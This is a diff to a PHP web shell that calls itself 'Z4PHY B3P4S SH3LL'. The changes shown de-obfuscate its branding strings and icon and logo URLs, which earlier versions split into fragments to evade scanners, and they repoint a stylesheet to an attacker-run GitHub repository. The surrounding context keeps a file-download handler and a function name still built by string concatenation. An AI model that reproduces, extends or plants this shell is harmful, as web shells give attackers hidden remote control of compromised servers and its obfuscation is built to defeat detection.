@@ -39,10 +39,10 @@ if (isset($_GET['downloadfile'])) {
     }
 }
 //config shell
-$s_he_ll_Name = "Z4"."PH"."Y "."B3"."P4S"." S"."H3"."LL";
-$s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."mai"."n/"."as"."set"."s/c"."i"."el".".p"."ng";
-$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/"."z4phyr"."/"."z4phy-c0de/"."ma"."in/"."ass"."ets"."/ci"."el-"."ph"."an"."tom"."hiv"."e.jp"."g";
-$s_he_ll_Footer = "<d"."iv"." cl"."as"."s='"."p-"."4 "."fo"."nt-"."bol"."d "."tex"."t-"."cen"."t"."er "."te"."xt-"."whi"."te "."da"."rk".":"."te"."xt"."-whi"."te'".">©"." "."2"."024"." Co"."py"."ri"."gh"."t: "."<a"." cl"."a"."ss="."'t"."ex"."t-r"."ed"."-8"."0"."0 "."da"."rk:"."te"."xt"."-r"."ed"."-40"."0' "."hre"."f="."'"."ht"."tps".":/"."/t".".me/"."za"."ynp"."han"."to"."mhi"."ve"."'>"."Za"."yn"." Ph"."ant"."omh"."iv"."e<"."/a".">"."</"."div".">";
+$s_he_ll_Name = "Z4PHY B3P4S SH3LL";
+$s_he_ll_Logo = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/ciel.png";
+$s_he_ll_Icon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/ciel-phantomhive.jpg";
+$s_he_ll_Footer = "<div class='p-4 font-bold text-center text-white dark:text-white'>© 2024 Copyright: <a class='text-red-800 dark:text-red-400' href='https://t.me/zaynphantomhive'>Z4PHY PHANT0MMHIVE</a></div>";
 
 //tailwind config text color
 $txtBlack = "text-black";
@@ -94,10 +94,10 @@ $whiteSemiParent2 = "rgba(255,255,255,0.2)";
 $whiteSemiParent3 = "rgba(255,255,255,0.3)";
 
 //icon config
-$filesIcon = "htt"."ps:/"."/r"."aw"."."."gi"."th"."ub"."us"."er"."co"."nt"."en"."t."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."ma"."in"."/a"."ss"."et"."s/"."fi"."le"."s."."pn"."g";
-$newFilesIcon = "ht"."tp"."s:"."//"."ra"."w."."gi"."th"."ub"."us"."er"."co"."nt"."en"."t."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."ma"."in"."/"."as"."se"."ts"."/n"."ew"."-f"."il"."es".".p"."ng";
-$folderIcon = "ht"."tp"."s:"."//"."ra"."w."."gi"."th"."ub"."us"."er"."co"."nt"."en"."t."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."ma"."in"."/a"."ss"."et"."s/f"."ol"."de"."r."."pn"."g";
-$newFolderIcon = "ht"."tp"."s:"."//"."ra"."w."."gi"."th"."ub"."us"."er"."con"."te"."nt".".c"."om"."/"."z4phyr"."/z"."4phy-c0de"."/"."ma"."in"."/a"."ss"."et"."s/"."ne"."w-"."fo"."ld"."er"."."."pn"."g";
+$filesIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/files.png";
+$newFilesIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/new-files.png";
+$folderIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/folder.png";
+$newFolderIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/new-folder.png";
 
 function Z4phyUname() {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
@@ -863,7 +863,7 @@ $path = str_replace("\\", "/", $path);
     <!-- Flowbite -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css" rel="stylesheet" />
     <!-- For Text Editor -->
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/css/style.css">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/css/z4p.css">
     <style id="style2" type="text/css"></style>
     <link id="theme1" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/vs2015.min.css" rel="stylesheet" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js" type="text/javascript"></script>
